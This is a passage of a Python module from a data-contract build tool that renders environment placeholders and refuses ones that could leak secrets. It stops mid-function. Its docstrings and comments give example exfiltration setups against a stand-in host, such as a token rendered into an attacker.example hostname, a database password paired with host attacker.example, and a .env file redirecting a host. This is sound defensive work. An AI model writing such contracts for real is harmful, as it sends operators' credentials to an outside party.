# Copyright 2025 Agentics Transformation Limited
# SPDX-License-Identifier: Apache-2.0

"""One reading of ``{{ env.NAME }}`` for every stage that renders a contract.

Four resolvers used to read the placeholder and disagreed about a variable that
is not set: one left the text as written, two rendered nothing, one refused. A
contract then deployed to a bucket named ``{{ env.S3_BUCKET }}``, or to a path
missing its first half, and the command exited 0. This is the one place that
decides.

The rules, for every caller:

* A name is **missing** when the variable is unset, empty or only blanks.
  :func:`render_contract` raises :class:`EnvTemplateError`, which lists every missing
  name and where it is written, before anything is deployed. The one exception is
  :func:`render_text`, the single-string primitive for a provider's optional field
  with a default: it leaves an unset variable's placeholder and renders an empty
  variable as empty, so that the field's fallback applies. The stages that deploy
  render a contract strictly before they reach it.
* A stage that deliberately leaves the placeholder for a later one says so by
  name: ``unset=UNSET_DEFER``. The call sites that do are the publish and export
  paths (a catalog shows the template), the preload of a contract embedded in a
  plan (each build renders it strictly when it runs), the validation report, and
  ``generate artifacts`` (it runs where the bundle is built, not where it is deployed).
  ``tests/test_env_templates_defer_sites.py`` pins the list, so nothing passes
  through unresolved by accident.
* A credential-shaped name (:func:`~fluid_build.observability.secret_redactor.is_sensitive_key_name`)
  is never rendered, whatever the mode: the rendered contract is written to
  ``main.tf.json``, to state, to a table COMMENT or to a catalog. It stays as
  written, with one warning per name, and is not "missing": policy refuses it.

* On the acquisition path, a host is not the contract's to pick from the operator's
  environment (:func:`check_host_templates`). A credential-shaped variable never
  renders into a URL or a host field. Any other variable renders into a URL's
  authority or a host field only when the operator pairs it with the host it
  makes (``NAME@host`` in ``FLUID_ACQUISITION_SECRET_REF_ALLOWLIST``), unless it
  *is* the host (``host: "{{ env.PGHOST }}"``): then the operator chose the
  address and the contract only named the variable. Rendered into
  ``https://{{ env.TOKEN }}.attacker.example`` a secret would be sent, in the host
  name, to whoever owns the domain.
* On the same path a variable is not the contract's to send to a host of its own
  choosing either (:func:`check_env_pairing`). Whatever it is called, a variable in a
  build's source or sink block renders only when every endpoint of those blocks is this
  machine, a host written as one whole ``{{ env.* }}``, or a host the operator paired
  with it: ``host: attacker.example`` beside ``password: "{{ env.DB_PW }}"`` would send DB_PW
  there, and a name cannot tell DB_PW, PGPASS or DATABASE_URL from a harmless variable.
* A host that is one whole variable is the operator's choice only while the value is the
  operator's: from the shell, the CI environment or ``FLUID_SECRETS_FILE``. A value that a
  project dotenv file supplied (``.env``, ``.env.<env>``, ``.env.local``, as
  ``credentials.dotenv_store`` records it) is the project's choice, and the project ships the
  contract too. Such a variable is paired like a host the contract wrote (``ZZZ=attacker.example``
  in ``.env`` beside ``host: "{{ env.ZZZ }}"`` is ``host: attacker.example``), wherever this
  module treats a whole-variable host as the operator's own: a host, a tunnel, an unread address.

Borrowed from the strict modes of ``envsubst -no-unset`` (collect every missing
name, then fail), Docker Compose's ``${VAR:?}`` (unset or empty is an error) and
Flux's ``--strict``; their "resolved later is always an explicit marker" is the
named ``UNSET_DEFER``. Stdlib only, so the light CLI path may import it.
"""

from __future__ import annotations

import logging
import os
import re
from dataclasses import dataclass
from typing import Any, Dict, List, Mapping, NamedTuple, Optional, Tuple

from fluid_build._errors import FluidUserError, doc_url

#: ``{{ env.NAME }}`` in a string. The one pattern: it takes any run of
#: non-space characters as the name, so a name that is not an identifier is
#: looked up (and reported) as written instead of passing through unseen.
ENV_TEMPLATE_RE = re.compile(r"\{\{\s*env\.(\S+?)\s*\}\}")

#: An unset or empty variable is an error (:class:`EnvTemplateError`).
UNSET_ERROR = "error"
#: The stage leaves the placeholder of an unset or empty variable as written, for a later stage
#: (which refuses it, if it is the one that deploys).
UNSET_DEFER = "defer"

#: A credential-shaped name is left as written (the default: a rendered contract is written to files,
#: state and catalogs).
SENSITIVE_REFUSE = "refuse"
#: A credential-shaped name renders like any other. For the build runners, which hand a connection's
#: ``password: "{{ env.PGPASSWORD }}"`` to the engine that connects; where a rendered value may go is the
#: secret policy's to judge there.
SENSITIVE_RENDER = "render"

#: How many field paths the error names before it counts the rest.
_PATHS_SHOWN = 6

_DEFAULT_LOG = logging.getLogger("fluid.env_templates")


def _has_value(value: Optional[str], strip: bool = True) -> bool:
    """Whether a variable holds something: not unset, not empty and, where the rendered string
    is stripped, not only blanks (which the ``.strip()`` would turn into an empty name)."""
    return value is not None and bool(value.strip() if strip else value)


@dataclass
class EnvTemplateError(FluidUserError):
    """``{{ env.NAME }}`` names variables that are unset or empty here."""

    code: str = "EnvTemplateError"


def _missing_error(fields: Mapping[str, List[str]], stage: Optional[str]) -> EnvTemplateError:
    names = sorted(fields)
    shown: List[str] = []
    for name in names:
        for place in fields[name][:2]:
            shown.append(f"{name} at {place}" if place else name)
    total = sum(len(places) for places in fields.values())
    if len(shown) > _PATHS_SHOWN:
        shown = shown[:_PATHS_SHOWN] + [f"and {total - _PATHS_SHOWN} more places"]
    return EnvTemplateError(
        what=(
            f"The contract needs {'an environment variable that is' if len(names) == 1 else 'environment variables that are'} "
            f"not set or empty here: {', '.join(names)}"
        ),
        where="; ".join(shown) or None,
        why=(
            "{{ env.NAME }} renders from the environment of the process that runs this "
            f"command{f' ({stage})' if stage else ''}. With no value it would deploy a name "
            "the contract never wrote (an empty one, or the literal placeholder) and still "
            "exit 0."
        ),
        fix=(
            f"Export {', '.join(names)} before the command (an empty value counts as unset), "
            "or correct the placeholder in the contract."
        ),
        doc=doc_url(),
        extras={
            "missing": names,
            "fields": {name: list(places) for name, places in fields.items()},
        },
    )


def placeholder_names(value: Any) -> List[str]:
    """The variable names ``value`` names, each once, in the order first written.

    Walks strings, lists and dicts; anything else names nothing.
    """
    found: Dict[str, None] = {}

    def walk(node: Any) -> None:
        if isinstance(node, str):
            if "{{" in node:
                for name in ENV_TEMPLATE_RE.findall(node):
                    found.setdefault(name.strip(), None)
        elif isinstance(node, list):
            for item in node:
                walk(item)
        elif isinstance(node, dict):
            for item in node.values():
                walk(item)

    walk(value)
    return list(found)


def render_text(
    text: str, environ: Optional[Mapping[str, str]] = None, *, strip: bool = True
) -> str:
    """``text`` with each ``{{ env.NAME }}`` replaced by the variable's value, leaving the
    placeholder of an unset variable as written (the :data:`UNSET_DEFER` rule).

    The single-string primitive for a caller that decides for itself what an
    unrendered placeholder means (a provider's optional field with a default). A
    string with ``{{`` in it comes back stripped, as it always did, unless ``strip``
    is false.
    """
    if not isinstance(text, str) or "{{" not in text:
        return text
    env = os.environ if environ is None else environ

    def sub(match: "re.Match[str]") -> str:
        value = env.get(match.group(1).strip())
        return match.group(0) if value is None else value

    out = ENV_TEMPLATE_RE.sub(sub, text)
    return out.strip() if strip else out


def render_contract(
    value: Any,
    *,
    unset: str = UNSET_ERROR,
    sensitive: str = SENSITIVE_REFUSE,
    environ: Optional[Mapping[str, str]] = None,
    purpose: Optional[str] = None,
    refusal: Optional[str] = None,
    stage: Optional[str] = None,
    strip: bool = True,
    logger: Optional[logging.Logger] = None,
) -> Any:
    """``value`` with every ``{{ env.NAME }}`` in its strings rendered, through lists and dicts.

    ``unset`` says what an unset or empty variable is: :data:`UNSET_ERROR` (the
    default) raises one :class:`EnvTemplateError` naming every missing variable
    and the fields that write it; :data:`UNSET_DEFER` leaves the placeholder as
    written. Nothing else decides: the caller names the mode.

    A credential-shaped name is never rendered in either ``unset`` mode unless the
    caller says ``sensitive=SENSITIVE_RENDER`` (see the module docstring); the
    warning says where the rendered ``value`` goes, as ``purpose``; a caller whose log line
    is part of its output contract gives it whole as ``refusal`` (one ``%s``, the variable
    name). ``stage`` names the command, for the error. ``strip`` keeps the historical ``.strip()`` of a string
    that holds ``{{``; a caller that renders paths or SQL turns it off. ``value`` is
    not changed.
    """
    if unset not in (UNSET_ERROR, UNSET_DEFER):
        raise ValueError(f"unset must be {UNSET_ERROR!r} or {UNSET_DEFER!r}, not {unset!r}")
    if sensitive not in (SENSITIVE_REFUSE, SENSITIVE_RENDER):
        raise ValueError(
            f"sensitive must be {SENSITIVE_REFUSE!r} or {SENSITIVE_RENDER!r}, not {sensitive!r}"
        )
    from fluid_build.observability.secret_redactor import is_sensitive_key_name

    env = os.environ if environ is None else environ
    log = logger or _DEFAULT_LOG
    warned: set[str] = set()
    missing: Dict[str, List[str]] = {}

    def refuse_sensitive(name: str) -> None:
        if name in warned:
            return
        warned.add(name)
        if refusal is not None:
            log.warning(refusal, name)
            return
        log.warning(
            "Refusing to resolve sensitive-looking env placeholder '{{ env.%s }}' in contract "
            "body; leaving it literal. %s: a credential must not ride along. If this value is "
            "not a secret, rename the variable outside the password/secret/token/key family.",
            name,
            purpose or "The rendered contract is written to files, state and catalogs",
        )

    def render(text: str, where: str) -> str:
        if "{{" not in text:
            return text

        def sub(match: "re.Match[str]") -> str:
            name = match.group(1).strip()
            if sensitive == SENSITIVE_REFUSE and is_sensitive_key_name(name):
                refuse_sensitive(name)
                return match.group(0)
            rendered = env.get(name)
            if rendered is not None and _has_value(rendered, strip):
                return rendered
            missing.setdefault(name, []).append(where)
            return match.group(0)

        out = ENV_TEMPLATE_RE.sub(sub, text)
        return out.strip() if strip else out

    def walk(node: Any, where: str) -> Any:
        if isinstance(node, dict):
            return {
                key: walk(item, f"{where}.{key}" if where else str(key))
                for key, item in node.items()
            }
        if isinstance(node, list):
            return [walk(item, f"{where}[{index}]") for index, item in enumerate(node)]
        if isinstance(node, str):
            return render(node, where)
        return node

    rendered_value = walk(value, "")
    if missing and unset == UNSET_ERROR:
        raise _missing_error(missing, stage)
    return rendered_value


#: The last word of a field name that holds a host, or a URL whose authority is one
#: (``host``, ``catalog_uri``, ``iceberg.catalog.uri``, ``bootstrap_servers``, ``server_url``):
#: the destination fields of ``secrets.policy`` plus the spellings connectors use.
HOST_FIELD_WORDS = frozenset(
    {"host", "hostname", "hosts", "uri", "url", "endpoint", "server", "servers", "brokers"}
    | {"address", "addresses"}
)
#: Whole field names that hold one, whatever their last word.
HOST_FIELD_NAMES = frozenset({"connection_string", "sqlalchemy_url"})


def is_host_field(key: str) -> bool:
    """Whether a field called ``key`` holds a host or a URL."""
    lowered = key.lower()
    return lowered in HOST_FIELD_NAMES or re.split(r"[._\-]", lowered)[-1] in HOST_FIELD_WORDS


#: A value read as a URL: a scheme (or a placeholder for it) and ``://``.
_URL_START = re.compile(r"[\s\x00-\x1f\x7f-\x9f]*(?:[A-Za-z][\w+.\-:]*|\{\{[^{}]*\}\})://")


def _authority_end(text: str, start: int) -> int:
    """Where the authority that begins at ``start`` ends: at the first ``/``, ``?`` or ``#``."""
    ends = [i for i in (text.find(c, start) for c in "/?#") if i != -1]
    return min(ends) if ends else len(text)


def _hosts_of(authority: str) -> List[str]:
    """Every host an authority (or a bare host field) names: userinfo and port dropped, a
    comma list split, lower-cased. MongoDB and libpq take several and may use any of them."""
    hosts: List[str] = []
    for piece in authority.rpartition("@")[2].split(","):
        piece = piece.strip()
        if piece.startswith("["):
            host = piece[1:].partition("]")[0]
        else:
            host = piece.partition(":")[0]
        hosts.append(host.strip().lower().rstrip("."))
    return hosts


#: The schemes whose "authority" is a bucket or a container, not a server a contract can point a
#: credential at: the engine is configured for the store, and the name only picks within it.
_STORE_SCHEMES = frozenset(
    {"s3", "s3a", "s3n", "gs", "gcs", "az", "azure", "abfs", "abfss", "wasb", "wasbs", "file"}
)
_CONTROL = re.compile(r"[\s\x00-\x1f\x7f-\x9f]")
#: The host in a keyword/value connection string (libpq, ODBC): ``host=db1 dbname=x``.
_KEYWORD_HOST = re.compile(
    r"(?:^|[\s;])(?:host|hostaddr|server|data source)\s*=\s*((?:\{\{[^{}]*\}\}|[^\s;{])+)", re.I
)


def _control_free(text: str) -> str:
    return _CONTROL.sub("", text)


def _authority_of(text: str, url: Optional["re.Match[str]"]) -> Optional[str]:
    """The part of ``text`` where a variable makes the host, or ``None`` when it names none.

    A URL's authority; for a value that is not a URL, the host it starts with (``host``,
    ``host:port``, ``//host/path``) or the host of a keyword/value connection string.
    """
    if url is not None:
        start = url.end()
        return text[start : _authority_end(text, start)]
    body = text.strip()
    if body.startswith("//"):
        body = body[2:]
    head = body[: _authority_end(body, 0)]
    if "=" in head:  # a keyword/value connection string: ``host=db1 dbname=x``
        keyword = _KEYWORD_HOST.search(head)
        return keyword.group(1) if keyword else None
    return head


def _host_refusal(
    name: str, where: str, *, credential: bool, stage: Optional[str], project: bool = False
) -> EnvTemplateError:
    """The refusal for one placeholder: its name and field, never a rendered value. ``project``:
    a project dotenv file supplied the variable's value (:func:`_project_supplied`)."""
    if credential:
        what = (
            f"{{{{ env.{name} }}}} is a credential-shaped variable in the URL or host field {where}"
        )
        why = (
            "A variable named like a credential never renders into a URL or a host: it would be "
            "sent, in the address, to whichever host the contract names."
        )
        fix = (
            "Give the credential to the connector as a secretRef, and write the host in the "
            f"contract. If {name} is not a secret, rename it outside the "
            "password/secret/token/key family."
        )
    elif project:
        what = (
            f"{{{{ env.{name} }}}} makes the host of {where}, a project dotenv file supplied its "
            "value, and the operator has not paired it with that host"
        )
        why = (
            "A host that a project dotenv file picks is the project's choice, not the operator's, "
            "and the project ships the contract too. A variable renders into a host only when the "
            "operator lists it with the host it makes, or holds the variable themselves."
        )
        fix = (
            f"Export {name} in the operator environment (the shell, CI or FLUID_SECRETS_FILE: "
            "the address is then yours), or add "
            f"{name}@<that host> to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator "
            "environment (the host is the one the value renders to), or write the host in the "
            "contract."
        )
    else:
        what = f"{{{{ env.{name} }}}} makes the host of {where}, and the operator has not paired it with that host"
        why = (
            "A variable renders into a host (or a URL's authority) only when the operator lists "
            "it with the host it makes, so a contract cannot send a value from the operator's "
            "environment to a host of its own choosing."
        )
        fix = (
            f"Add {name}@<that host> to FLUID_ACQUISITION_SECRET_REF_ALLOWLIST in the operator "
            "environment (the host is the one the value renders to), or write the host in the "
            "contract."
        )
    return EnvTemplateError(
        what=what,
        where=where,
        why=why + (f" ({stage})" if stage else ""),
        fix=fix,
        doc=doc_url(),
        extras={
            "variable": name,
            "field": where,
            "reason": "credential" if credential else "unpaired",
            **({"origin": "project-dotenv"} if project and not credential else {}),
        },
        code="EnvTemplateHostError",
    )


def _is_one_template(text: str) -> bool:
    """Whether ``text`` is exactly one placeholder, read as :func:`render_contract` reads it
    (the shortest ``{{ env.NAME }}`` each time), so ``{{env.A}}.x{{env.B}}`` is two."""
    return len(ENV_TEMPLATE_RE.findall(text)) == 1 and not ENV_TEMPLATE_RE.sub("", text).strip()


def _whole_variable(text: str) -> Optional[str]:
    """The name of the variable ``text`` is, when it is exactly one placeholder."""
    return ENV_TEMPLATE_RE.findall(text)[0].strip() if _is_one_template(text) else None


def _project_supplied(name: str, env: Mapping[str, str]) -> bool:
    """Whether the value ``env`` holds for ``name`` came from a project dotenv file.

    ``credentials.dotenv_store`` records what the project's ``.env``, ``.env.<env>`` and
    ``.env.local`` put into the environment. A name the operator already held, in the shell or in the
    CI environment, is not recorded, and nor is one ``FLUID_SECRETS_FILE`` sets: the value in
    effect is theirs. ``fluid apply`` loads the project's files before it renders anything, and
    they load any name that is not on the credential policy's list, so ``ZZZ=attacker.example``
    in ``.env`` makes ``{{ env.ZZZ }}`` an address the project picked.
    """
    from fluid_build.credentials.dotenv_store import project_value_in_effect

    return project_value_in_effect(name, env)


def _operators_choice(text: str, env: Mapping[str, str]) -> bool:
    """Whether ``text`` is one whole variable whose value is the operator's own: the address (or
    the bastion) is theirs, and the contract only names which variable holds it. A variable a
    project dotenv file supplied is not (:func:`_project_supplied`): the project picked it."""
    name = _whole_variable(text)
    return name is not None and not _project_supplied(name, env)


def _pairing_names(authority: str, env: Mapping[str, str]) -> List[str]:
    """The variables of ``authority`` (a URL's authority, or a host field) that the operator must
    pair with the host: every one except a variable that is the whole host name and the
    operator's own (:func:`_operators_choice`).

    ``user@{{ env.H }}:5432`` leaves ``H`` alone (the operator's variable makes the address; the
    contract named only which one) but not a variable in the userinfo or the port, nor one with
    text beside it (``{{ env.H }}.example``, ``db-{{ env.H }}``), nor a second variable, nor one
    that a project dotenv file supplied.
    """
    userinfo, at, hostport = authority.rpartition("@")
    port_at = hostport.rfind(":")
    if port_at != -1 and hostport.find("]", port_at) == -1:
        hostname, port = hostport[:port_at], hostport[port_at:]
    else:
        hostname, port = hostport, ""
    names = [raw.strip() for raw in ENV_TEMPLATE_RE.findall(userinfo + port)]
    if _operators_choice(hostname, env):
        return names
    return names + [raw.strip() for raw in ENV_TEMPLATE_RE.findall(hostname)]


def check_host_templates(
    value: Any,
    *,
    environ: Optional[Mapping[str, str]] = None,
    stage: Optional[str] = None,
) -> None:
    """Refuse an ``{{ env.NAME }}`` that would put the operator's environment into an address.

    Run on the contract as written, before :func:`render_contract` expands it, and
    for a string that is a URL or sits in a host field (:func:`is_host_field`):

    * a credential-shaped name (anywhere in that value) is refused;
    * any other name in the URL's authority, or in a host field, is refused unless
      the operator lists it with every host the value renders to
      (:func:`fluid_build.secrets.policy.variable_allowed`, so a loopback host needs no
      entry), or it is the whole host name: ``host: "{{ env.PGHOST }}"`` names which
      variable holds the address, and the operator chose the address, unless a project
      dotenv file supplied the variable (:func:`_project_supplied`): then the project chose
      it, and it is paired like any other. A variable that is unset is left to
      :func:`render_contract`, which says so.

    Raises :class:`EnvTemplateError` naming the variable and the field, never the
    rendered value.
    """
    from fluid_build.observability.secret_redactor import is_sensitive_key_name
    from fluid_build.secrets.policy import variable_allowed

    env = os.environ if environ is None else environ

    def check(text: str, where: str, key: str) -> None:
        if "{{" not in text or ENV_TEMPLATE_RE.search(text) is None:
            return
        url = _URL_START.match(text)
        if url is None and not is_host_field(key):
            return
        if url is not None and _control_free(text[: url.end() - 3]).lower() in _STORE_SCHEMES:
            return  # a bucket or a container of a store the engine is configured for, not a server
        if url is None:
            body = text.strip()
            if body.startswith("/") and not body.startswith("//"):
                return  # a path (a REST stream's ``endpoint: /v1/users``), not an address
        for raw in ENV_TEMPLATE_RE.findall(text):
            name = raw.strip()
            if is_sensitive_key_name(name):
                raise _host_refusal(name, where, credential=True, stage=stage)
        authority = _authority_of(text, url)
        if authority is None:
            return
        # A client that reads a backslash as a slash ends the authority there; one that does not
        # reads on to the ``@``. Either could be the one that connects, so with a backslash in
        # the authority every variable in it is paired, with both hosts.
        slashed = "\\" in authority
        names = (
            [raw.strip() for raw in ENV_TEMPLATE_RE.findall(authority)]
            if slashed
            else _pairing_names(authority, env)
        )
        if not names:
            return
        if any(
            not _has_value(env.get(raw.strip()), strip=False)
            for raw in ENV_TEMPLATE_RE.findall(authority)
        ):
            return  # render_contract reports the missing variable
        rendered = ENV_TEMPLATE_RE.sub(lambda m: env[m.group(1).strip()], authority)
        hosts = _hosts_of(rendered) or [""]
        if slashed:
            hosts += _hosts_of(rendered.partition("\\")[0]) or [""]
        for name in names:
            for host in hosts:
                if not variable_allowed(name, host or None, environ=env):
                    raise _host_refusal(
                        name,
                        where,
                        credential=False,
                        stage=stage,
                        project=_project_supplied(name, env),
                    )

    def walk(node: Any, where: str, key: str) -> None:
        if isinstance(node, str):
            check(node, where, key)
        elif isinstance(node, list):
            for index, item in enumerate(node):
                walk(item, f"{where}[{index}]", key)
        elif isinstance(node, dict):
            for field, item in node.items():
                walk(item, f"{where}.{field}" if where else str(field), str(field))

    walk(value, "", "")


# ── every variable of a block, against every endpoint the contract picks for that block ──
#
# ``check_host_templates`` judges a variable that makes a host. This judges the variables that go
# TO one: ``connection: {host: attacker.example, password: "{{ env.DB_PW }}"}`` sends DB_PW to
# attacker.example whatever the variable is called, and a name cannot tell a secret from the rest
# (``DB_PW``, ``PGPASS``, ``DATABASE_URL``). So the key is the destination, as the operator's secret
# policy already judges it for a ``secretRef`` in the same block.


def _value_at(node: Any, path: Tuple[Any, ...]) -> Any:
    """What ``node`` holds at ``path`` (keys and list indexes); ``None`` for nothing."""
    for part in path:
        if isinstance(node, Mapping):
            node = node.get(part)
        elif isinstance(node, (list, tuple)) and isinstance(part, int) and 0 <= part < len(node):
            node = node[part]
        else:
            return None
    return node


def _dotted(base: str, path: Tuple[Any, ...]) -> str:
    """``base`` with ``path`` appended the way a field is named: ``a.b[0].c``."""
    out = base
    for part in path:
        if isinstance(part, int):
            out = f"{out}[{part}]"
        else:
            out = f"{out}.{part}" if out else str(part)
    return out


def _replaced_at(node: Any, path: Tuple[Any, ...], text: str) -> Any:
    """A copy of ``node`` whose string at ``path`` is ``text``; what is not on the path is shared."""
    if not path:
        return text
    head, rest = path[0], path[1:]
    if isinstance(node, Mapping):
        mapping = dict(node)
        mapping[head] = _replaced_at(node[head], rest, text)
        return mapping
    if isinstance(node, (list, tuple)):
        items = list(node)
        items[head] = _replaced_at(node[head], rest, text)
        return items
    return node


def _removed_at(node: Any, path: Tuple[Any, ...]) -> Any:
    """A copy of ``node`` without what ``path`` names (a list item becomes ``None`` so that the
    other indexes keep their place); what is not on the path is shared."""
    head, rest = path[0], path[1:]
    if isinstance(node, Mapping):
        mapping = dict(node)
        if rest:
            mapping[head] = _removed_at(node[head], rest)
        else:
            mapping.pop(head, None)
        return mapping
    if isinstance(node, (list, tuple)):
        items = list(node)
        items[head] = _removed_at(items[head], rest) if rest else None
        return items
    return node


def _names_in(node: Any, where: str, found: Dict[str, str]) -> None:
    """Each variable ``node`` names, with the first field that writes it, in the order written."""
    if isinstance(node, str):
        if "{{" in node:
            for raw in ENV_TEMPLATE_RE.findall(node):
                found.setdefault(raw.strip(), where)
    elif isinstance(node, (list, tuple)):
        for index, item in enumerate(node):
            _names_in(item, f"{where}[{index}]", found)
    elif isinstance(node, Mapping):
        for key, item in node.items():
            _names_in(item, f"{where}.{key}" if where else str(key), found)


def _authority_span(text: str) -> Optional[Tuple[int, int]]:
    """Where in ``text`` the authority is (a URL's, or the host a bare host field holds), or
    ``None`` for a keyword/value connection string, whose host the policy does not read."""
    url = _URL_START.match(text)
    if url is not None:
        return url.end(), _authority_end(text, url.end())
    start = len(text) - len(text.lstrip())
    if text[start:].startswith("//"):
        start += 2
    end = _authority_end(text, start)
    return None if "=" in text[start:end] else (start, end)


#: What :func:`_rendered_endpoint` returns for a field that names no endpoint at all.
_NOT_AN_ENDPOINT = object()


def _is_path(text: str) -> bool:
    """Whether ``text`` is a path (a REST ``endpoint: /v1/users``, a file ``uri: /data/in.csv``, a
    socket directory), which names no host: it starts with ``/`` but not ``//`` and holds no ``://``.
    """
    body = text.strip()
    return body.startswith("/") and not body.startswith("//") and "://" not in body


def _split_hostport(hostport: str) -> Tuple[str, str]:
    """``host:port`` as ``(host, ":port")``; an IPv6 literal keeps its colons."""
    port_at = hostport.rfind(":")
    if port_at != -1 and hostport.find("]", port_at) == -1:
        return hostport[:port_at], hostport[port_at:]
    return hostport, ""


def _host_variable(text: str) -> Optional[str]:
    """The variable that is the whole host of ``text`` (a URL, or a bare host field), if one is."""
    span = _authority_span(text)
    if span is None:
        return None
    hostname, _port = _split_hostport(text[span[0] : span[1]].rpartition("@")[2])
    return _whole_variable(hostname)


def _rendered_endpoint(text: str, env: Mapping[str, str]) -> Any:
    """An endpoint field as the secret policy should judge it: its variables rendered, except a
    host that is one whole variable of the operator's, which stands as ``localhost``: the
    operator chose that address and the contract only named the variable
    (:func:`check_host_templates`). A variable that a project dotenv file supplied renders like
    any other: the project chose that address (:func:`_project_supplied`). A URL keeps its
    userinfo, port and path around it; a bare host field, which the policy reads whole, is
    ``localhost`` whole.

    ``None`` when a variable it names is not set (:func:`render_contract` says which);
    :data:`_NOT_AN_ENDPOINT` when the field is a path.
    """
    names = [raw.strip() for raw in ENV_TEMPLATE_RE.findall(text)]
    if any(not _has_value(env.get(name), strip=False) for name in names):
        return None
    if names:
        span = _authority_span(text)
        if span is not None:
            start, end = span
            userinfo, at, hostport = text[start:end].rpartition("@")
            hostname, port = _split_hostport(hostport)
            if _operators_choice(hostname, env):
                if _URL_START.match(text) is not None:
                    text = text[:start] + userinfo + at + "localhost" + port + text[end:]
                elif end == len(text):
                    return "localhost"
        text = ENV_TEMPLATE_RE.sub(lambda match: env[match.group(1).strip()], text)
    return _NOT_AN_ENDPOINT if _is_path(text) else text


#: A field name (lower case, letters and digits only) that says it holds an address: Kafka's
#: ``bootstrap_servers``, ``brokers``, ``db_host``, ``address``, a Snowflake ``account``. The
#: policy reads some of these (``host``, ``uri``, ``server``, ``endpoint``) and not the rest.
_ADDRESS_KEY = re.compile(r"(?:host|hostname|server|broker|address|endpoint|url|uri)s?$|account$")


def _names_an_address(text: str, unjudged_schemes: Any, env: Mapping[str, str]) -> bool:
    """Whether ``text`` may be an address: not blank, not a path, not one whole variable of the
    operator's (their choice; one a project dotenv file supplied is the project's), and not a
    store or a local file (``s3://bucket``, ``sqlite:///x``)."""
    body = text.strip()
    if not body or _is_path(body) or _operators_choice(body, env):
        return False
    url = _URL_START.match(body)
    return url is None or _control_free(body[: url.end() - 3]).lower() not in unjudged_schemes


def _unread_addresses(
    block: Mapping[str, Any], targets: Optional[List[Any]], env: Mapping[str, str]
) -> List[str]:
    """The top-level fields of ``block`` that are named for an address and hold one, but that
    ``secrets.policy`` read no endpoint from (its walk reads ``host``, ``uri``, ``server``,
    ``endpoint``, a URI under any name, ...; not ``bootstrap_servers``, ``db_host`` or ``Host``).

    A connector that takes its host from one sends the block's variables there, so the policy's own
    answer for a block that names no endpoint it can read, refusal, is this check's answer here:
    only an entry for any host clears it.
    """
    from fluid_build.secrets.policy import _UNJUDGED_SCHEMES

    read = {t.path for t in targets or [] if t.path}
    found: List[str] = []
    for key, value in block.items():
        if (key,) in read or not _ADDRESS_KEY.search(re.sub(r"[^a-z0-9]", "", str(key).lower())):
            continue
        texts = (
            [value]
            if isinstance(value, str)
            else (
                [item for item in value if isinstance(item, str)]
                if isinstance(value, (list, tuple))
                else []
            )
        )
        if any(_names_an_address(text, _UNJUDGED_SCHEMES, env) for text in texts):
            found.append(str(key))
    return found


def _names_no_endpoint(targets: Optional[List[Any]]) -> bool:
    """Whether ``targets`` (:func:`~fluid_build.secrets.policy._destination_targets`) are the
    one unreadable destination that policy adds when it found none: a block that names no
    endpoint, as against a field that is present and blank or unreadable."""
    return targets is not None and all(
        t.host is None
        and t.field is None
        and not t.path
        and not t.has_reason
        and t.keyword_text is None
        for t in targets
    )


def _endpoint_view(
    block: Mapping[str, Any], env: Mapping[str, str]
) -> Tuple[Optional[Mapping[str, Any]], List[str]]:
    """``block`` with only its endpoint fields rendered, for the secret policy to judge, and the
    fields named for an address that the policy reads no endpoint from (:func:`_unread_addresses`).

    The endpoints are the ones ``secrets.policy`` finds in the block as written (a host, a URI,
    a keyword string, a query string that names a host, a tunnel's host, ...). ``None`` when
    there is nothing to judge: the block's one destination is an object store (the gap that policy
    documents), it names no endpoint of its own (the engine's own configuration decides where it
    connects), or an endpoint names a variable that is not set (:func:`render_contract` refuses it).
    """
    from fluid_build.secrets.policy import _destination_targets

    targets = _destination_targets(block, None)
    unread = _unread_addresses(block, targets, env)
    if targets is None or _names_no_endpoint(targets):
        return None, unread
    view: Any = block
    tunnels = {t.path for t in targets if t.tunnel and t.path}
    operators_tunnels: List[Any] = []
    for path in dict.fromkeys(t.path for t in targets if t.path):
        leaf = _value_at(block, path)
        if not isinstance(leaf, str):
            continue
        text = _rendered_endpoint(leaf, env)
        if text is None:
            return None, unread
        if path in tunnels and _operators_choice(leaf, env):
            # The operator's own bastion, like any host that is one whole variable of theirs.
            operators_tunnels.append(path[0])
        elif text is _NOT_AN_ENDPOINT:
            view = _removed_at(view, path)
        else:
            view = _replaced_at(view, path, text)
    for field in operators_tunnels:
        view = _removed_at(view, (field,))
    # What the policy reads once the endpoints are rendered: a lone word such as ``localhost``
    # under a nested field names no host there, so a block may have none left to judge.
    after = _destination_targets(view, None)
    return (None if after is None or _names_no_endpoint(after) else view), unread


def _unpaired(name: str, view: Mapping[str, Any], env: Mapping[str, str]) -> bool:
    """Whether the secret policy refuses to send variable ``name`` to every endpoint of ``view``.

    One destination judgement for every kind of secret: the same
    :func:`~fluid_build.secrets.policy.refuse_unless_allowed` a ``secretRef`` in the block meets.
    """
    from fluid_build.secrets.policy import AcquisitionSecretPolicyError, refuse_unless_allowed
    from fluid_build.secrets.ref import SecretRef

    try:
        refuse_unless_allowed(
            SecretRef(scheme="env", locator=name, written_scheme="env"),
            connection=view,
            environ=env,
            rendered=True,
        )
    except AcquisitionSecretPolicyError:
        return True
    return False


def _host_written_literally(written: Any) -> bool:
    """Whether the host of the field ``written`` is text the contract wrote, whatever a variable
    in its userinfo, path or query renders to: a URL's scheme and host part, or a bare host whole.
    """
    if not isinstance(written, str):
        return False
    if "{{" not in written:
        return True
    url = _URL_START.match(written)
    if url is None:
        return False
    authority = written[url.end() : _authority_end(written, url.end())]
    return "{{" not in written[: url.end()] and "{{" not in authority.rpartition("@")[2]


class _Endpoint(NamedTuple):
    """Where a variable is sent, for a refusal."""

    #: The endpoint as the contract wrote it, never a rendered value.
    where: str
    #: The host to name in the allowlist entry: ``""`` for a host a variable makes, ``None`` for
    #: an endpoint no host can be named for.
    host: Optional[str]
    #: The variable that is the whole host, when a project dotenv file supplied its value.
    via: Optional[str] = None


def _describe_endpoint(
    name: str, view: Mapping[str, Any], block: Mapping[str, Any], block_where: str, env: Any
) -> _Endpoint:
    """The endpoint of ``block`` that variable ``name`` is not paired with, as the contract wrote
    it, and the host to name in the allowlist entry: a literal host by name (exactly as the policy
    reads it, a port included in a bare host field), a host a variable makes by its field, never a
    rendered value. The host is ``None`` for an endpoint no host can be named for."""
    from fluid_build.secrets.policy import _destination_targets, variable_allowed

    targets = _destination_targets(view, None) or []
    for target in sorted(targets, key=lambda t: not t.has_reason):
        if target.local or variable_allowed(
            name, target.host, environ=env, loopback_exempt=not target.behind_tunnel
        ):
            continue
        field = _dotted(block_where, target.path) if target.path else block_where
